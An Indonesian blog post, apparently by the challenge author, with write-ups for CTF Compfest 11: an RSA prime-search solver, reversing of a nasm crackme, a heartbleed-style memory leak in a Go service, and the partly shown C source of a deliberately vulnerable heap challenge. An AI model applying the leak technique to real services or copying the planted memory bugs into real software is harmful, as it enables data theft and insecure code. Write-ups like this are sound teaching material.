---
layout: post
author: zafirr
title:  "[Long Overdue] CTF Compfest 11 Writeups"
description: Sorry :v
date: 2019-11-13
last_modified_at: 2019-11-13
categories: writeup
lang: id
tags:
    - ctf
    - compfest
---

## Indonesian
CTF Compfest 11 merupakan pertama kali aku menjadi pembuat soal untuk lomba pemograman. Saya telah membuat 4 soal, 3 untuk kualifikasi dan 1 untuk final. Aku akan menjelaskan cara menyelesaikan semua soal pada post ini.

## 1. Optimus Prime (Kriptografi)
Semua file yang saya gunakan untuk menyelesaikan soal ini terdapat [disini](https://drive.google.com/open?id=1pptFStC7o6BO7Xie8YucUzQ1WH2yY55I)

Optimus prime merupakan soal kriptografi yang berdasar [RSA](https://en.wikipedia.org/wiki/RSA_(cryptosystem)). Pemain diberi 2 file, yaitu nums.txt dan rsa.txt. File rsa.txt berisi 2 angka, yaitu _public exponent_ (e) dan _ciphertext_ (c). Nah jika anda sudah mengerti RSA, pasti anda tau bahwa untuk melakukan enkripsi dan dekripsi dibutuhkan suatu modulus (N). Pada soal ini, modulus N disembunyikan di dalam file nums.txt. file nums.txt berisi 10^7 angka random, tapi berbeda dari soal biasa, modulus N tidak terdapat di dalam file nums.txt.

Jadi dimana modulusnya? Daripada menyembunyikan modulus langsung di nums.txt, saya menempatkan kedua prima yang membentuk modulus didalam nums.txt. Nah mungkin anda berpikir, jika saya harus brute force 2 bilangan prima antara 10^7 angka, saya membutuhkan 10^14 komputasi untuk melakukannya, itu butuh waktu yang luar biasa lama!

Ok sebelum menunjukkan solusi mari kita liat beberapa angka di nums.txt terlebih dahulu.

![Error](/assets/images/Optimus-Prime-1.png)

Jika belum terlihat cara menyelesaikannya, mari liat solusinya.

Untuk menyelesaikan soal ini, sedikit pengetahuan dibutuhkan, yaitu bahwa faktor yang membentuk N adalah bilangan PRIMA! Daripada bruteforce dengan cara biasa, menggunakan sesuatu seperti [_Fermat primality test_](https://en.wikipedia.org/wiki/Fermat_primality_test) atau [_Miller-Rabin primality test_](https://en.wikipedia.org/wiki/Miller%E2%80%93Rabin_primality_test) sangat cepat. Menurut [StackOverflow](https://math.stackexchange.com/questions/379592/computing-the-running-time-of-the-fermat-primality-test), kompleksitas kedua algoritma tersebut adalah O(k * log n * log n * log n), jelas sangat cepat. Juga, probabilitas mendapatkan angka Carmichael adalah sangat kecil, sekitar 0.00000017, jadi angka yang mungkin prima yang bersisa dari 10^7 seharusnya sangat sedikit.

Awalnya saya hanya ingat ada 2 bilangan prima di dalam nums.txt, tapi karena satu dan lain hal akhirnya saya menaruh sekitar 1300 prima di dalamnya. Seharusnya tidak begitu pengaruh, sebab bruteforce 10^3\*10^3 sangat memungkinkan.

Berikut script yang saya gunakan untuk menyelesaikan soal ini

```python


import random
import sys

print 'Finding likely primes...'

print 'Step 1: regular division testing'

divisors = [2,3,5,7,11,13,17,19,23,29,31,37,41,43,47]

with open('nums.txt', 'r') as f, open('newnums.txt', 'w') as l:
   nums = f.readlines()
   for num in nums:
      num = int(num)
      hehe = True
      for i in divisors:
         if num % i == 0:
            hehe = False
      if hehe:
         l.write(str(num) + '\n')

print 'Step 1 Complete!'
print

print 'Step 2: Fermat testing...'

nums = []
with open('newnums.txt', 'r') as f:
   nums = f.readlines()

def fermat_test(n):
   # Implementation uses the Fermat Primality Test
   n = int(n)
   for i in range(40):
      a = random.randint(1, n-1)
      if pow(a, n-1, n) != 1:
         return False
   return True

with open('likely_primes.txt', 'w') as f:
   for i in nums:
      if fermat_test(i):
         f.write(str(i))

print 'Step 2 Complete!!!'

print '=================='

print 'Got likely primes!'
print

print 'Solving RSA...'
# solve rsa
nums = []
with open('likely_primes.txt', 'r') as f:
   nums = f.readlines()

def solve_rsa(p, q, e, c):
   
   def egcd(a, b):
      if a == 0:
         return (b, 0, 1)
      else:
         g, y, x = egcd(b % a, a)
         return (g, x - (b // a) * y, y)

   def modinv(a, m):
      g, x, y = egcd(a, m)
      if g != 1:
         return 1
      else:
         return x % m

   p = int(p)
   q = int(q)
   n = p*q
   x = (p-1)*(q-1)
   d = modinv(e, x)

   a = pow(c, d, n)
   a = hex(a)[2:-1]
   try:
      msg = a.decode('hex')
   except:
      msg = ''
   return msg

with open('rsa.txt', 'r') as f:
   e = int(f.readline()[3:])
   c = int(f.readline()[3:])

counter = 1
for i in range(len(nums)):
   print 'Testing pair {}'.format(counter)
   counter += 1
   for j in range(i+1, len(nums)):
      if nums[i] == '\n' or nums[j] == '\n':
         continue
      else:
         msg = solve_rsa(nums[i], nums[j], e, c)
         if 'COMPFEST11' in msg:
            print '='*20
            print 'Flag:', msg
            print '='*20
            sys.exit(0)
```

Menjalankan script di atas seharusnya mengeluarkan flag

Flag: COMPFEST11{z4fIRr_i5_aW3s0me_ya}

<br>
<br>
<br>

## 2. red pill or blue pill (Reversing)
Semua file yang saya gunakan untuk menyelesaikan soal ini terdapat [disini](https://drive.google.com/open?id=1pptFStC7o6BO7Xie8YucUzQ1WH2yY55I)

Aku sebenarnya paling bangga dengan soal ini, sebab ini pertama kali saya ngoding pure dengan nasm :)

Ketika menjalankan file tersebut, permain tidak diberi _prompt_ apapun :P, tapi mencoba untuk input sesuatu akan mengeluarkan string pendek. Biasanya dari sekarang orang mulai _disassembly_, tapi karena buruknya saya ngoding, melakukan itu sulit :P. Tidak ghidra maupun IDA mengeluarkan dekompilasi yang cantik, jadi _disassembly_ merupakan caranya, hanya gdb!

Possible output:

![Error](/assets/images/red-pill-or-blue-pill-1.png)

_disassembly_:

```
   0x8049000:  xor    eax,eax
   0x8049002:  xor    ebx,ebx
   0x8049004:  xor    ecx,ecx
   0x8049006:  xor    edx,edx
   0x8049008:  mov    eax,0x3
   0x804900d:  mov    ebx,0x0
   0x8049012:  mov    ecx,0x804a000
   0x8049017:  mov    edx,0x100
   0x804901c:  int    0x80
   0x804901e:  mov    ebp,esp
   0x8049020:  mov    DWORD PTR [ebp+0x4],0xffffffff
   0x8049027:  add    DWORD PTR [ebp+0x4],0x1
   0x804902b:  mov    eax,DWORD PTR [ebp+0x4]
   0x804902e:  mov    eax,DWORD PTR [eax+0x804a000]
   0x8049034:  test   eax,eax
   0x8049036:  jne    0x8049027
   0x8049038:  mov    eax,DWORD PTR [ebp+0x4]
   0x804903b:  cmp    eax,0x1d
   0x804903e:  je     0x8049045
   0x8049040:  jmp    0x804910e
   0x8049045:  mov    DWORD PTR [ebp+0x4],0xffffffff
   0x804904c:  mov    DWORD PTR [ebp+0x10],0x7f
   0x8049053:  jmp    0x80490ad
   0x8049055:  mov    DWORD PTR [ebp+0x8],0xffffffff
   0x804905c:  mov    DWORD PTR [ebp+0xc],0x0
   0x8049063:  mov    ebx,DWORD PTR [ebp+0x4]
   0x8049066:  jmp    0x8049097
   0x8049068:  xor    eax,eax
   0x804906a:  mov    al,BYTE PTR [ebp+0x8]
   0x804906d:  mov    ecx,0x1d
   0x8049072:  imul   ecx
   0x8049074:  mov    ecx,eax
   0x8049076:  mov    dl,BYTE PTR [ebx+ecx*1+0x804a100]
   0x804907d:  xor    ecx,ecx
   0x804907f:  mov    ecx,DWORD PTR [ebp+0x8]
   0x8049082:  mov    al,BYTE PTR [ecx+0x804a000]
   0x8049088:  imul   dl
   0x804908a:  add    DWORD PTR [ebp+0xc],eax
   0x804908d:  mov    eax,DWORD PTR [ebp+0xc]
   0x8049090:  cdq    
   0x8049091:  idiv   DWORD PTR [ebp+0x10]
   0x8049094:  mov    DWORD PTR [ebp+0xc],edx
   0x8049097:  add    DWORD PTR [ebp+0x8],0x1
   0x804909b:  mov    eax,DWORD PTR [ebp+0x8]
   0x804909e:  cmp    eax,0x1d
   0x80490a1:  jl     0x8049068
   0x80490a3:  mov    eax,DWORD PTR [ebp+0xc]
   0x80490a6:  mov    ebx,DWORD PTR [ebp+0x4]
   0x80490a9:  mov    DWORD PTR [ebp+ebx*1+0x14],eax
   0x80490ad:  add    DWORD PTR [ebp+0x4],0x1
   0x80490b1:  mov    eax,DWORD PTR [ebp+0x4]
   0x80490b4:  cmp    eax,0x1d
   0x80490b7:  jl     0x8049055
   0x80490b9:  jmp    0x80490eb
   0x80490bb:  mov    eax,0x4
   0x80490c0:  mov    ebx,0x1
   0x80490c5:  mov    ecx,0x804a449
   0x80490ca:  mov    edx,0xa
   0x80490cf:  int    0x80
   0x80490d1:  jmp    0x8049126
   0x80490d3:  mov    eax,0x4
   0x80490d8:  mov    ebx,0x1
   0x80490dd:  mov    ecx,0x804a453
   0x80490e2:  mov    edx,0xe
   0x80490e7:  int    0x80
   0x80490e9:  jmp    0x8049126
   0x80490eb:  mov    DWORD PTR [ebp+0x4],0xffffffff
   0x80490f2:  jmp    0x8049100
   0x80490f4:  mov    al,BYTE PTR [ecx+0x804a478]
   0x80490fa:  cmp    al,BYTE PTR [ebp+ecx*1+0x14]
   0x80490fe:  jne    0x80490d3
   0x8049100:  add    DWORD PTR [ebp+0x4],0x1
   0x8049104:  mov    ecx,DWORD PTR [ebp+0x4]
   0x8049107:  cmp    ecx,0x1d
   0x804910a:  jl     0x80490f4
   0x804910c:  jmp    0x80490bb
   0x804910e:  mov    eax,0x4
   0x8049113:  mov    ebx,0x1
   0x8049118:  mov    ecx,0x804a461
   0x804911d:  mov    edx,0x17
   0x8049122:  int    0x80
   0x8049124:  jmp    0x8049126
   0x8049126:  mov    eax,0x1
   0x804912b:  int    0x80
```

Jujur sebenarnya ini tidak terlihat terlalu rumit, hanya 84 baris assembly jelek yang perlu di reverse, aneh kenapa cuma 3 tim yang berhasil solve.

### The Syscalls
Jika anda sudah tau sedikit tentang cara assembly bekerja, anda pasti tau bahwa hal seperti I/O memerlukan [syscall](https://en.wikipedia.org/wiki/System_call). Dikarenakan ini binary 32-bit, syscall dipanggil dengan instruksi `int 0x80`. Ok ayo kita lihat beberapa instruksi.

Ini adalah setup dan membaca input. Input ditempatkan didalam suatu buffer di 0x804a000

```
   0x8049000:  xor    eax,eax
   0x8049002:  xor    ebx,ebx
   0x8049004:  xor    ecx,ecx
   0x8049006:  xor    edx,edx
   0x8049008:  mov    eax,0x3
   0x804900d:  mov    ebx,0x0
   0x8049012:  mov    ecx,0x804a000
   0x8049017:  mov    edx,0x100
   0x804901c:  int    0x80
```

Ini mencetak apa yang ada di 0x804a449

```
   0x80490bb:  mov    eax,0x4
   0x80490c0:  mov    ebx,0x1
   0x80490c5:  mov    ecx,0x804a449
   0x80490ca:  mov    edx,0xa
   0x80490cf:  int    0x80
```

Ini mencetak apa yang ada di 0x804a453

```
   0x80490d3:  mov    eax,0x4
   0x80490d8:  mov    ebx,0x1
   0x80490dd:  mov    ecx,0x804a453
   0x80490e2:  mov    edx,0xe
   0x80490e7:  int    0x80
```

Ini mencetak apa yang ada di 0x804a461

```
   0x804910e:  mov    eax,0x4
   0x8049113:  mov    ebx,0x1
   0x8049118:  mov    ecx,0x804a461
   0x804911d:  mov    edx,0x17
   0x8049122:  int    0x80
```

Dan ini exit dari program

```
   0x8049126:  mov    eax,0x1
   0x804912b:  int    0x80
```

Simpel kan? Nah sisanya tinggal kita reverse.

### Ayo mulai memecahkan
Ok mari kita liat logika utamanya

```
   0x804901e:  mov    ebp,esp
   0x8049020:  mov    DWORD PTR [ebp+0x4],0xffffffff
   0x8049027:  add    DWORD PTR [ebp+0x4],0x1
   0x804902b:  mov    eax,DWORD PTR [ebp+0x4]
   0x804902e:  mov    eax,DWORD PTR [eax+0x804a000]
   0x8049034:  test   eax,eax
   0x8049036:  jne    0x8049027
   0x8049038:  mov    eax,DWORD PTR [ebp+0x4]
   0x804903b:  cmp    eax,0x1d
   0x804903e:  je     0x8049045
   0x8049040:  jmp    0x804910e
   0x8049045:  mov    DWORD PTR [ebp+0x4],0xffffffff
   0x804904c:  mov    DWORD PTR [ebp+0x10],0x7f
   0x8049053:  jmp    0x80490ad
   0x8049055:  mov    DWORD PTR [ebp+0x8],0xffffffff
   0x804905c:  mov    DWORD PTR [ebp+0xc],0x0
   0x8049063:  mov    ebx,DWORD PTR [ebp+0x4]
   0x8049066:  jmp    0x8049097
   0x8049068:  xor    eax,eax
   0x804906a:  mov    al,BYTE PTR [ebp+0x8]
   0x804906d:  mov    ecx,0x1d
   0x8049072:  imul   ecx
   0x8049074:  mov    ecx,eax
   0x8049076:  mov    dl,BYTE PTR [ebx+ecx*1+0x804a100]
   0x804907d:  xor    ecx,ecx
   0x804907f:  mov    ecx,DWORD PTR [ebp+0x8]
   0x8049082:  mov    al,BYTE PTR [ecx+0x804a000]
   0x8049088:  imul   dl
   0x804908a:  add    DWORD PTR [ebp+0xc],eax
   0x804908d:  mov    eax,DWORD PTR [ebp+0xc]
   0x8049090:  cdq    
   0x8049091:  idiv   DWORD PTR [ebp+0x10]
   0x8049094:  mov    DWORD PTR [ebp+0xc],edx
   0x8049097:  add    DWORD PTR [ebp+0x8],0x1
   0x804909b:  mov    eax,DWORD PTR [ebp+0x8]
   0x804909e:  cmp    eax,0x1d
   0x80490a1:  jl     0x8049068
   0x80490a3:  mov    eax,DWORD PTR [ebp+0xc]
   0x80490a6:  mov    ebx,DWORD PTR [ebp+0x4]
   0x80490a9:  mov    DWORD PTR [ebp+ebx*1+0x14],eax
   0x80490ad:  add    DWORD PTR [ebp+0x4],0x1
   0x80490b1:  mov    eax,DWORD PTR [ebp+0x4]
   0x80490b4:  cmp    eax,0x1d
   0x80490b7:  jl     0x8049055
```

Anda mungkin memerlukan sedikit pengalaman dengan assembly, tapi semua yang dieksekusi kecuali yang diantara 0x8049068 dan 0x8049068 merupakan loop, lebih spesifik nested loop yang memiliki batas -1 dan 29 (ekslusif). Jadi jika kita mencoba untuk menulisnya sebagai python [_pseudocode_](https://en.wikipedia.org/wiki/Pseudocode), kita mendapatkan:

```python
for i in range(0, 29):
   for j in range(0, 29):
      <lakukan sesuatu>
```

Nah saya bukan compiler, jadi loop yang saya hasilkan tidak semantap gcc. Tapi OK lah ya.

### Apa it \<lakukan sesuatu\>
Jadi sekarang kita tahu bahwa ini adalah nested loop yang berjalan dari -1 sampai 29 (ekslusif), tapi apa yang terjadi di dalam loopnya? Nah mari kita melihat instruksi dibawah ini:

```
0x8049076:  mov    dl,BYTE PTR [ebx+ecx*1+0x804a100]
```

Kita kita nyatakan bahwa ebx dan ecx berdua bernilai angka yang kecil, maka instruksi ini hanya mereferensikan suatu nilai di 0x804a100 dan menyimpannya di dl. Dengan pengalaman sedikit, terlihat bahwa notasi seperti ini merupakan indikasi mengakses matriks. Jadi nested loop kita mengakses sebuah matrix, sekarang _pseudocode_ kita menjadi:

```python
for i in range(0, 29):
   for j in range(0, 29):
      matrix[i*29 + j]
```

Sekarang ada 2 instruksi lagi yang perlu dilihat, yaitu:

```
   0x8049088:  imul   dl
   .
   .
   .
   0x8049091:  idiv   DWORD PTR [ebp+0x10]
```
`imul` ada perkalian, dan `idiv` adalah pembagian, tapi dengan apa? Menurut [dokumentasi nasm](http://home.myfairpoint.net/fbkotler/nasmdocr.html), `imul` mengalikan nilai yang diberikan dengan nilai yang berada di al/dx:ax/edx:eax. Karena kita sekarang mengalikan dengan dl, maka nilai al adalah nilai yang dikalikan. Nilai tersebut disimpan di al. `idiv` hampir sama, nilainya dibagi dengan al/dx:ax/edx:eax, dan hasil baginya disimpan di al/ax/eax serta sisa baginya disimpan di ah/dx/edx. Karena kita membagi dengan sebuah DWORD, maka hasilnya disimpan di eax dan sisa baginya disimpan di edx.

Nah kita tau dari instruksi sebelumnya bahwa dl merupakan nilai dari matrix, tapi apa nilai dari al? Kita bisa menemukan itu disini:

```
   0x804907d:  xor    ecx,ecx
   0x804907f:  mov    ecx,DWORD PTR [ebp+0x8]
   0x8049082:  mov    al,BYTE PTR [ecx+0x804a000]
```

Oh rupanya al merupakan nilai yang kita input. Kita juga tapi dari salah satu instruksi bahwa ketika sedang menyiapkan loop, nilai yang terdapat di [ebp+0x10] adalah 0x7f, jadi hasil perkalian dibagi dengan 0x7f, mantap.

Tapi kenapa sih kita membagi? Mari liat instruksi setelahnya:

```
   0x8049091:  idiv   DWORD PTR [ebp+0x10]
   0x8049094:  mov    DWORD PTR [ebp+0xc],edx
```

Oh jadi nilai edx yang diambil, dan itu merupakan hasil baginya. Nilai tersebut terus disimpan dengan instruksi berikut:

```
   0x80490a3:  mov    eax,DWORD PTR [ebp+0xc]
   0x80490a6:  mov    ebx,DWORD PTR [ebp+0x4]
   0x80490a9:  mov    DWORD PTR [ebp+ebx*1+0x14],eax
```

Maka _pseudocode_ kita menjadi berikut:

```python
for i in range(0, 29):
   for j in range(0, 29):
      result[i] = (matrix[i*29 + j] * password[i]) % 0x7f
```

### Terus kenapa
Ya jadi kita tau bahwa ada sebuah perkalian matrix dan hasilnya disimpan, tapi untuk apa itu? Nah ada satu bagian lagi yang belum dibahas, yaitu bagian ini:

```
   0x80490eb:  mov    DWORD PTR [ebp+0x4],0xffffffff
   0x80490f2:  jmp    0x8049100
   0x80490f4:  mov    al,BYTE PTR [ecx+0x804a478]
   0x80490fa:  cmp    al,BYTE PTR [ebp+ecx*1+0x14]
   0x80490fe:  jne    0x80490d3
   0x8049100:  add    DWORD PTR [ebp+0x4],0x1
   0x8049104:  mov    ecx,DWORD PTR [ebp+0x4]
   0x8049107:  cmp    ecx,0x1d
   0x804910a:  jl     0x80490f4
   0x804910c:  jmp    0x80490bb
```

Sederhananya ini membandingkan hasil perkalian matrix dengan data yang sudah ada dalam file tersebut, jika sama bagus jika beda ngak. Jika semua nilai sama maka yang telah kita input merupakan password yang benar. Selesai :)

Flag: COMPFEST11{ya_Its_wE1rD_z3_do3S_Not_w0Rk}

### Tambahan:
*  z3 tidak dapat menyelesaikan ini, dia membutuhkan waktu yang sangat lama! Gunakan sageMath!
*  Inputnya mesti tepat 29 byte, diakhiri null, anda tidak dapat menginputnya secara langsung karena akan ditambah karakter '\n'!

<br>
<br>
<br>

## 3. helloabcdefghijklmnop
Soal ini adalah soal terakhir dari saya untuk kualifikasi, soal ini terdiri dari 2 file yang di- _compile_ dengan go-lang yang bernama "client" dan "server". File "server" merupakan file yang sedang dijalankan di service, sementara file "client" dijalankan oleh pemain dan akan otomatis bersambung dengan service. Client merupakan system chat palsu dan sepertinya "down", tapi server yang menjalankannya masih jalan. Untuk tes jika servernya tetap berjalan, client dapat mengirim sebuah string, dan jika string yang sama dikembalikan oleh server, maka servernya tetap jalan.

Example:

![Error](/assets/images/helloabcdefghijklmnop-1.png)

![Error](/assets/images/helloabcdefghijklmnop-2.png)

### Bug
Jadi apa bugnya? Mungkin ini dapat membantu (sumber [xkcd](https://xkcd.com/1354/)):

![Error](/assets/images/helloabcdefghijklmnop-3.png)

Ya, ini merupakan soal heartbleed. Aku tidak terlalu bangga dengannya, karena aku berpikir kalo source dikasih akan terlalu mudah, dan jika tidak diberi akan sulit. Pada akhirnya aku tidak memberikannya, tapi masalahnya soalnya menjadi sangat berat untuk direverse karena mesti mengerti cara go-lang meng _compile_, dan juga cara go-lang menyimpan varibalenya.

Aku akan menjelaskan dikit untuk membantu.

### Go-lang
Go-lang menyimpan hampir semua variablenya di dalam stack, termasuk parameter fungsi dan nilai kembali fungsi. Ini merupakan salah satu alasan _decompiler_ seperti Ghidra dan IDA kesusahan dan tidak begitu enak dilihat ketika dekompilasi, melihat _disassembly_ juga susah sendirinya. Cara aku harap tim dapat solve soalnya adalah dengan melihat _disassemblynya_, tapi aku salah. Mari kita liat beberapa bagian dari fungsi utama di file "client". Tidak semua, hanya yang penting

```
  4dcd11:  48 8d 0d 48 d2 05 00    lea    0x5d248(%rip),%rcx        # 539f60 <go.itab.*os.File,io.Reader>
  4dcd18:   48 89 8c 24 98 03 00    mov    %rcx,0x398(%rsp)
  4dcd1f:   00 
  4dcd20:   48 89 84 24 a0 03 00    mov    %rax,0x3a0(%rsp)
  4dcd27:   00 
  4dcd28:   48 8d 05 71 e4 04 00    lea    0x4e471(%rip),%rax        # 52b1a0 <go.func.*+0x2>
  4dcd2f:   48 89 84 24 a8 03 00    mov    %rax,0x3a8(%rsp)
  4dcd36:   00 
  4dcd37:   48 c7 84 24 b0 03 00    movq   $0x10000,0x3b0(%rsp)
  4dcd3e:   00 00 00 01 00 
  4dcd43:   48 8d 94 24 98 03 00    lea    0x398(%rsp),%rdx
  4dcd4a:   00 
  4dcd4b:   48 89 14 24             mov    %rdx,(%rsp)
  4dcd4f:   e8 0c eb ff ff          callq  4db860 <bufio.(*Scanner).Scan>
  4dcd54:   48 8b 84 24 b8 03 00    mov    0x3b8(%rsp),%rax
  4dcd5b:   00 
  4dcd5c:   48 8b 8c 24 c0 03 00    mov    0x3c0(%rsp),%rcx
  4dcd63:   00 
  4dcd64:   48 8b 94 24 c8 03 00    mov    0x3c8(%rsp),%rdx
  4dcd6b:   00 
  4dcd6c:   48 89 44 24 08          mov    %rax,0x8(%rsp)
  4dcd71:   48 89 4c 24 10          mov    %rcx,0x10(%rsp)
  4dcd76:   48 89 54 24 18          mov    %rdx,0x18(%rsp)
  4dcd7b:   48 c7 04 24 00 00 00    movq   $0x0,(%rsp)
  4dcd82:   00 
  4dcd83:   e8 18 59 f6 ff          callq  4426a0 <runtime.slicebytetostring>
  4dcd88:   48 8b 44 24 28          mov    0x28(%rsp),%rax
  4dcd8d:   48 89 44 24 58          mov    %rax,0x58(%rsp)
  4dcd92:   48 8b 4c 24 20          mov    0x20(%rsp),%rcx
  4dcd97:   48 89 8c 24 b8 01 00    mov    %rcx,0x1b8(%rsp)
  4dcd9e:   00 
  4dcd9f:   48 8d 94 24 20 01 00    lea    0x120(%rsp),%rdx
  4dcda6:   00 
  4dcda7:   48 89 14 24             mov    %rdx,(%rsp)
  4dcdab:   48 89 4c 24 08          mov    %rcx,0x8(%rsp)
  4dcdb0:   48 89 44 24 10          mov    %rax,0x10(%rsp)
  4dcdb5:   e8 26 5b f6 ff          callq  4428e0 <runtime.stringtoslicerune>
  4dcdba:   0f b7 44 24 20          movzwl 0x20(%rsp),%eax
  4dcdbf:   48 8d 4c 24 44          lea    0x44(%rsp),%rcx
  4dcdc4:   48 89 0c 24             mov    %rcx,(%rsp)
  4dcdc8:   48 89 44 24 08          mov    %rax,0x8(%rsp)
  4dcdcd:   e8 5e 5e f6 ff          callq  442c30 <runtime.intstring>
  4dcdd2:   48 8b 44 24 18          mov    0x18(%rsp),%rax
  4dcdd7:   48 8b 4c 24 10          mov    0x10(%rsp),%rcx
  4dcddc:   48 89 4c 24 08          mov    %rcx,0x8(%rsp)
  4dcde1:   48 89 44 24 10          mov    %rax,0x10(%rsp)
  4dcde6:   48 8d 84 24 80 00 00    lea    0x80(%rsp),%rax
  4dcded:   00 
  4dcdee:   48 89 04 24             mov    %rax,(%rsp)
  4dcdf2:   48 8b 84 24 b8 01 00    mov    0x1b8(%rsp),%rax
  4dcdf9:   00 
  4dcdfa:   48 89 44 24 18          mov    %rax,0x18(%rsp)
  4dcdff:   48 8b 4c 24 58          mov    0x58(%rsp),%rcx
  4dce04:   48 89 4c 24 20          mov    %rcx,0x20(%rsp)
  4dce09:   e8 b2 56 f6 ff          callq  4424c0 <runtime.concatstring2>
  4dce0e:   48 8b 44 24 30          mov    0x30(%rsp),%rax
  4dce13:   48 89 44 24 48          mov    %rax,0x48(%rsp)
  4dce18:   48 8b 4c 24 28          mov    0x28(%rsp),%rcx
  4dce1d:   48 89 8c 24 a0 01 00    mov    %rcx,0x1a0(%rsp)
  4dce24:   00 
  4dce25:   48 8b 94 24 b8 01 00    mov    0x1b8(%rsp),%rdx
  4dce2c:   00 
  4dce2d:   48 89 94 24 58 02 00    mov    %rdx,0x258(%rsp)
  4dce34:   00 
  4dce35:   48 8b 5c 24 58          mov    0x58(%rsp),%rbx
  4dce3a:   48 89 9c 24 60 02 00    mov    %rbx,0x260(%rsp)
  4dce41:   00 
  4dce42:   0f 57 c0                xorps  %xmm0,%xmm0
  4dce45:   0f 11 84 24 68 02 00    movups %xmm0,0x268(%rsp)
  4dce4d:   48 8d 35 2c 71 01 00    lea    0x1712c(%rip),%rsi        # 4f3f80 <type.*+0x15d60>
  4dce54:   48 89 34 24             mov    %rsi,(%rsp)
  4dce58:   48 8d bc 24 58 02 00    lea    0x258(%rsp),%rdi
  4dce5f:   00 
  4dce60:   48 89 7c 24 08          mov    %rdi,0x8(%rsp)
  4dce65:   e8 66 1c f3 ff          callq  40ead0 <runtime.convT2Estring>
```

Aduh apa ituuuu, sebagian besar tidak penting, kita liat aja fungsi yang digunakan.

```
  4dcd11:  48 8d 0d 48 d2 05 00    lea    0x5d248(%rip),%rcx        # 539f60 <go.itab.*os.File,io.Reader>
   .
   .
  4dcd28:   48 8d 05 71 e4 04 00    lea    0x4e471(%rip),%rax        # 52b1a0 <go.func.*+0x2>
   .
   .
  4dcd4f:   e8 0c eb ff ff          callq  4db860 <bufio.(*Scanner).Scan>
   .
   .
  4dcd83:   e8 18 59 f6 ff          callq  4426a0 <runtime.slicebytetostring>
   .
   .
  4dcdb5:   e8 26 5b f6 ff          callq  4428e0 <runtime.stringtoslicerune>
   .
   .
  4dcdcd:   e8 5e 5e f6 ff          callq  442c30 <runtime.intstring>
   .
   .
  4dce09:   e8 b2 56 f6 ff          callq  4424c0 <runtime.concatstring2>
   .
   .
  4dce65:   e8 66 1c f3 ff          callq  40ead0 <runtime.convT2Estring>
```

Ok, mungkin ini memerlukan sedikit pengalaman dan waktu sebentar googling, tapi fungsi ini sederhananya melakukan ini:
*  membaca input
*  string menjadi array of "runes"
*  ambil panjang array tersebut
*  panjangnya diubah menjadi "rune"
*  tambahkan panjangnya ke array of "runes" tersebut
*  array tersebut diubah menjadi string kembali

Ok seharusnya sini sudah jelas, ubah aja panjangnya menjadi angka yang besar dan data penting seharusnya dikirim kembali, data penting tersebut adalah flag.

Flag: COMPFEST11{ya_heartbleed_was_cool_and_all}

### Feedback ke diri sendiri
Lain kali aku buat programnya lebih susah, tapi source code diberi, sepertinya itu opsi lebih baik daripada program yang mudah tapi tanpa source. Tidak ada tim yang berhasil menyelesaikan soal ini .-.

<br>
<br>
<br>

## 4. Fruity Goodness (Binary Exploitation)
Semua file yang saya gunakan untuk menyelesaikan soal ini terdapat [disini](https://drive.google.com/open?id=1pptFStC7o6BO7Xie8YucUzQ1WH2yY55I)

Fruity goodness adalah soal Binary Exploitation yang didasari heap, dengan sebagian besar inspirasinya didapatkan dari Exploit [House of Orange](https://1ce0ear.github.io/2017/11/26/study-house-of-orange/). Aku sebenarnya ingin buat soal yang mirip permainan [Pokemon](https://www.pokemon.com/us/), dan sepertinya berhasil(?)

Mari kita liat source codenya (Diberi karena format final Compfest adalah Attack-Defence):

```c
   #include<stdio.h>
   #include<stdlib.h>
   #include<string.h>
   #include<signal.h>
   #include<time.h>

   struct Fruit
   {
      int coolness;
      int tastiness;
      int number;
      char *name;
      struct Fruit *next_fruit;
      int level;
   };

   int number_of_fruits = 0;
   struct Fruit *newest_fruit = NULL;
   struct Fruit *first_fruit = NULL;

   void timeout()
   {
      puts("Sorry thats it for the demo!");
      exit(0);
   }

   void flusher()
   {
      fflush(stdin);
      fflush(stdout);
      fflush(stderr);
   }

   void setup()
   {
      signal(SIGALRM, timeout);
      alarm(150);
      setvbuf(stdin, NULL, _IONBF, 0);
      setvbuf(stdout, NULL, _IONBF, 0);
      setvbuf(stderr, NULL, _IONBF, 0);
      srand(time(NULL));
      puts("==================================================");
      puts("WELCOME TO FRUIT WAR v6.9");
      puts("I'm still a noob C coder :(, please report any bugs you find");
      puts("I'm also poor so i cant pay you :(");
      puts("Hopefully you have fun!");
      puts("==================================================");
   }

   void menu()
   {
      flusher();
      puts("1. I want a new fruit");
      puts("2. I want to train my fruit");
      puts("3. I want to list all my fruits");
      puts("4. I want out :(");
      puts("Your choice:");
      return;
   }

   void make_fruit()
   {  
      if(number_of_fruits > 5)   {
         puts("Sorry... We only have the resources for 5 fruits...");
         exit(-1);
      }
      struct Fruit *new_fruit = malloc(sizeof(struct Fruit));
      new_fruit->coolness = 0;
      new_fruit->tastiness = 0;
      new_fruit->level = 0;
      new_fruit->number = number_of_fruits;
      if(number_of_fruits == 0)  {
         first_fruit = new_fruit;
      }
      else  {
         newest_fruit->next_fruit = new_fruit;
      }
      newest_fruit = new_fruit;
      puts("How long do you want this fruit's name to be? (Max 4096 characters)");
      int length;
      scanf("%d", &length);
      getchar();
      if(length > 4096) {
         puts("NO! BAD!");
         exit(-1);
      }
      char new_name[length];
      puts("What do you want this fruit's name to be?");
      fgets(new_name, length, stdin);
      new_fruit->name = malloc(length);
      strncpy(new_fruit->name, new_name, length);
      number_of_fruits++;
      puts("Fruit Made!");
      return;
   }

   struct Fruit *get_fruit(int fruit_number) {
      struct Fruit *temp = first_fruit;
      for(int i = 0; i < fruit_number; i++)  {
         temp = temp->next_fruit;
         if(temp == NULL)  {
            puts("Something went wrong!");
            exit(-1);
         }
      }
      return temp;
   }

   void evolve_berry()  {
      usleep(1000000);
      for(int i = 0; i < 10; i++)   {
         puts(".");
         for(int j = 0; j < 20; j++)
            puts("");
         usleep(400000);
         puts("/\\");
         puts("\\/");
         for(int j = 0; j < 20; j++)
            puts("");
         usleep(400000);
      }
      puts("Congratz your fruit evolved into a berry!");
      return;
   }

   void evolve_apple()  {
      usleep(1000000);
      for(int i = 0; i < 10; i++)   {
         puts("/\\");
         puts("\\/");
         for(int j = 0; j < 20; j++)
            puts("");
         usleep(400000);
         puts(" ,(.");
         puts("(   )");
         puts(" `\"'");
         for(int j = 0; j < 20; j++)
            puts("");
         usleep(400000);
      }
      puts("Congratz your fruit evolved into an apple!");
      return;
   }

   void evolve_orange() {
      usleep(1000000);
      for(int i = 0; i < 10; i++)   {
         puts(" ,(.");
         puts("(   )");
         puts(" `\"'");
         for(int j = 0; j < 20; j++)
            puts("");
         usleep(400000);
